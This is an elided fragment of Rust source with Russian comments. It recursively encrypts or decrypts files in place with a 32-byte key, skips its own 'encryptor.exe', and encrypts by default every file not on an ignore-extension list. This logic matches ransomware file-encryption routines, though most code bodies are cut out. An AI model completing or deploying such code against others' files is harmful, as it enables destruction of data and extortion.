...
pub fn process_path(path_str: &str, key: &[u8; 32], mode: &str, encrypt_only_target: bool) -> Result<(usize, usize), String> {
	...
	if path.is_file() {
		...
		let result = if mode == "encrypt" {
			...
			decrypt_file_in_place(path, key)
		};
			...
			.filter_map(|e| e.ok())
		{
			...
			// Пропускаем сам encryptor.exe
			if let Some(name) = entry_path.file_name() {
				if name == "encryptor.exe" {
					continue;
				}
			}

			// Проверка расширения для шифрования
			...
			let result = if mode == "encrypt" {
				encrypt_file_in_place(entry_path, key)
			} else {
				decrypt_file_in_place(entry_path, key)
			};
		...
		println!();
		if skipped > 0 {
			println!("   ⏭️  Skipped {} files (ignored extensions)", skipped);
		}
	}
...
fn should_encrypt_file(path: &Path) -> bool {
	...
	match extension {
		Some(ext) => {
			// Никогда не трогаем ignore-расширения
			if IGNORE_EXTENSIONS.contains(&ext.as_str()) {
				return false;
			}
			// Если расширение в списке целевых - шифруем
			if TARGET_EXTENSIONS.contains(&ext.as_str()) {
				return true;
			}
			// Если расширение не в ignore и не в target - по умолчанию шифруем
			// (можно изменить на false, если нужно только target)
			true
		}
		None => {
			// Файлы без расширения - шифруем
			true
		}
	}
}
